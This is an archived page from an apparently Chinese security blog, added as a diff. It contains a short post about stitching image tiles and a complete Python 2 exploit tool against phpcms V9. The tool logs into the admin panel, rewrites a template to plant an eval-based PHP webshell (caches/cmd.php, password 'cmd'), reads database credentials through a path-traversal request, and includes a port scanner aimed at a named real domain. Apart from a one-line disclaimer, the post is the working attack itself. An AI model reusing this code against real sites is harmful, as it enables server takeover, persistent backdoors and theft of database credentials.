@@ -1,0 +1,677 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>python | Return&#39;s Blog </title>
+  <meta name="author" content="Return">
+  
+  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
+  
+  
+  
+  <meta property="og:site_name" content="Return&#39;s Blog "/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+   <link rel="apple-touch-icon" href="/icon.png" />
+   <link rel="shortcut icon" href="/favicon.png" >
+   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+</head>
+
+
+<body>
+  <div id="content" class="inner">
+    <aside id="sidebar" class="alignleft">
+      <div class="navigationBar">
+        <a href="/">Return&#39;s Blog </a>
+      </div>
+    	
+  <nav class="widget" id="menu">
+	<ul>
+    
+      <li class="cell"><a class="next" href="/">Home</a><li>
+    
+      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
+    
+      <li class="cell"><a class="next" href="/about/">About</a><li>
+    
+    </ul>
+</nav>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
+  
+    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
+  
+    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
+  
+    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
+  </div>
+</div>
+
+
+    	<footer id="footer" class="inner"><div class="copyright">
+  
+  &copy; 2014 Return
+  
+</div>
+
+
+<div style="position:relative; bottom: 23px">
+  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
+  </script>
+</div>
+
+
+</footer>
+    </aside>
+    
+    
+    <div id="hidden-navigationBar" class="navigationBar">
+      <a href="/">Return&#39;s Blog </a>
+    </div>
+    <div id="main-col" class="alignright">
+    <div id="wrapper">
+      
+<h2 class="archive-title tag">python</h2>
+
+
+  
+    
+<article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+  <header>
+      
+      
+  
+    <h1 class="title"><a href="/html/2013-03-12-python拼接图片.html">Python拼接图片</a></h1>
+  
+
+      <time datetime="2013-03-12T05:42:13.000Z"><a href="/html/2013-03-12-python拼接图片.html">3月 12 2013</a></time>
+      
+  </header>
+    <div class="entry">
+      
+        <p>貌似这是13年第一次写文章了。好吧，去年主要写一些安全方面的文章，今年就把技术文章也加进来，已做笔记（其实天天用evenote）。</p>
+<p>人常说，不偷懒的程序员不是好程序员。今天有个任务比较麻烦，当然这个还不是我自己的任务。其实是美工的，不过一个团队，能帮</p>
+<p>点尽量帮点忙。神马任务呢？就是游戏的图场景已经被地图编辑器分割成300×300像素的小图。然后部门经理要美工吧图都拼成大图以便</p>
+<p>修改方便…100多场景，每个场景里面至少150张小图，任你美工技术多牛叉，我想没一个星期是弄不来的。</p>
+<p>So 就帮妹子一把~。~</p>
+
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/html/2013-03-12-python拼接图片.html#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+  
+    
+<article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+  <header>
+      
+      
+  
+    <h1 class="title"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">Python版 phpcmsV9自动写shell工具</a></h1>
+  
+
+      <time datetime="2012-08-07T17:21:18.000Z"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">8月 8 2012</a></time>
+      
+  </header>
+    <div class="entry">
+      
+        <p>最近一直在学习python相关内容就顺手写个工具以作练习，上代码：</p>
+<blockquote>
+<p>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+</pre></td><td class="code"><pre>#coding: GBK
+'''
+Created on 2012-8-2
+
+@author: Return
+'''
+import cookielib
+import urllib2,urllib
+import re
+import sys
+import os
+import socket
+class getShell:
+
+    rhost = ''                                  #远程目标主机
+    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置
+    codeSavePath    = 'tmp/code/code.png'       #code    保存位置
+    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话
+    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
+    tmpPath         = ''    #临时地址存贮变量
+    dataBaseInfo    = {}    #数据库信息
+    postData        = {}    #post数据
+    url             = ''    #远程url地址
+    username        = ''    #用户名
+    password        = ''    #用户密码
+    vfCode          = ''    #验证码
+    pc_hash         = ''    #phpcmsV9校验值
+    result          = ''    #临时变量
+    #==============================================================
+    # __init__    初始化函数
+    #==============================================================
+    def __init__(self):
+        self.cookie = cookielib.LWPCookieJar()
+        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))
+    #==============================================================
+    # login    登录
+    #==============================================================
+    def login(self):
+        self.getVerifyCode()    #先获取验证码
+        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'
+        self.postData = {
+             'username':self.username,
+             'password':self.password,
+             'code':self.vfCode,
+             'dosubmit':''
+            }
+        self.url = 'http://'+self.rhost+self.tmpPath
+        self.result = self.urlPostData()
+
+        if len(re.findall(&quot;登录成功&quot;,self.result)):
+            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()
+            print '登录成功'
+            self.wirteShell() # 登陆成功后写入shell
+        else:
+            print '登录失败'
+            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)
+            self.login()
+    def wirteShell(self):
+        print '写入Shell...'
+        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='
+        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过
+        self.result = self.urlPostData()
+        if len(re.findall('点击插入',self.result)):
+            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)
+            #提交写shell模版
+            self.postData = {
+                    'code':self.phpShell,
+                    'dosubmit':'提交',
+                    'pc_hash':self.pc_hash
+                }
+            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
+            self.urlPostData()
+            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell
+            #写回原模版
+            self.postData = {
+                    'code':templateTmp,
+                    'dosubmit':'提交',
+                    'pc_hash':self.pc_hash
+                }
+            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
+            self.urlPostData()
+        else:
+            print '没有找到Search的foot模版...'
+    #==============================================================
+    # getVerifyCode    获取验证码
+    #==============================================================
+    def getVerifyCode(self):
+        #验证码获取地址
+        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='
+        self.url = 'http://'+self.rhost+self.tmpPath
+        open(self.codeSavePath,'wb').write(self.urlPostData())
+        print '请输入验证码:'
+        self.showPic()
+        self.vfCode = sys.stdin.readline()
+
+    #==============================================================
+    # urlPostData    url Post提交数据
+    #==============================================================
+    def urlPostData(self):
+        postData = urllib.urlencode(self.postData)
+        req = urllib2.Request(
+                          url = self.url,
+                          data = postData,
+                          headers = self.header
+                          )
+        result = urllib2.urlopen(req).read()
+        self.saveCookie()
+        self.delVariable()
+        return result
+
+    #==============================================================
+    # getDataBaseInfo    获取数据库信息
+    #==============================================================
+    def getDataBaseInfo(self):
+        #爆数据库信息地址
+        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'
+        self.url = 'http://'+self.rhost+self.tmpPath
+        result = self.urlPostData()
+        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()
+        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()
+        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()
+        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()
+        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()
+        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()
+    #==============================================================
+    # printDbInfo    输出数据库信息
+    #==============================================================
+    def printDbInfo(self):
+        print 'HostName:',self.dataBaseInfo['hostName']
+        print 'DataBase:',self.dataBaseInfo['database']
+        print 'UserName:',self.dataBaseInfo['username']
+        print 'Password:',self.dataBaseInfo['password']
+        print 'TablePre:',self.dataBaseInfo['tablepre']
+        print 'DataType:',self.dataBaseInfo['type']
+    #==============================================================
+    # scanPort    端口扫描
+    #==============================================================
+    def scanPort(self):
+        for p in range(80,8000):
+            try:
+                ip = 'www.gidigame.com'
+                port = p
+                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((ip,port))
+                print 'Port:',port,' open'
+                s.close()
+            except socket.error,msg:
+                pass
+                #print 'Port:',port,' close'
+    #==============================================================
+    # setRhost    设置目标主机
+    #==============================================================
+    def setRhost(self,host):
+        self.rhost = host
+    #==============================================================
+    # getRhost    获取目标主机
+    #==============================================================
+    def getRhost(self):
+        return self.rhost
+    #==============================================================
+    # setShell    自定义shell
+    #==============================================================
+    def setShell(self,shellCode):
+        self.phpShell = shellCode
+    #==============================================================
+    # saveCookie    保存cookie值
+    #==============================================================
+    def saveCookie(self):
+        self.cookie.save(self.cookieSavePath)
+    #==============================================================
+    # logMsg    日志信息，这里可以自己捕捉异常后处理信息
+    #==============================================================
+    def logMsg(self,msg):
+        print msg
+        exit()
+    #==============================================================
+    # showPic    用来显示验证码
+    #==============================================================
+    def showPic(self):
+        imgPath = os.path.abspath(self.codeSavePath)
+        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)
+    #==============================================================
+    # delVariable    清除变量，防止产生误差
+    #==============================================================
+    def delVariable(self):
+        self.url            = ''
+        self.tmpPath        = ''
+        self.dataBaseInfo   = {}
+        self.postData       = {}
+        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
+    #==============================================================
+    # __del__    析构函数，类被注销时候调用
+    #==============================================================
+    def __del__(self):
+        print 'Bye...'
+def sysinfo():
+    print '''
+********************************************************************************
+PHPcmsV9 自动写shell
+
+功能：自动写入caches目录下cmd.php一句话 密码:cmd
+
+Author: Return    Blog:www.creturn.com
+
+Example: exp.py www.creutn.com username password
+********************************************************************************
+'''
+#================================================================
+# main    入口函数
+#================================================================
+def main():
+    sysinfo();
+    shell = getShell()
+    if(len(sys.argv) &gt; 3):
+        shell.setRhost(sys.argv[1])
+        shell.username = sys.argv[2]
+        shell.password = sys.argv[3]
+	shell.login()
+    else:
+        print '参数不对！'
+
+if __name__ == '__main__':
+    main()
+</pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+  
+
+  <nav id="pagination">
+  
+  
+</nav>
+</div>
+    </div>
+    <div class="tabbar" onload="divideTabBar()">
+	
+      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
+    
+</div>
+
+
+  </div>
+</body>
+</html>
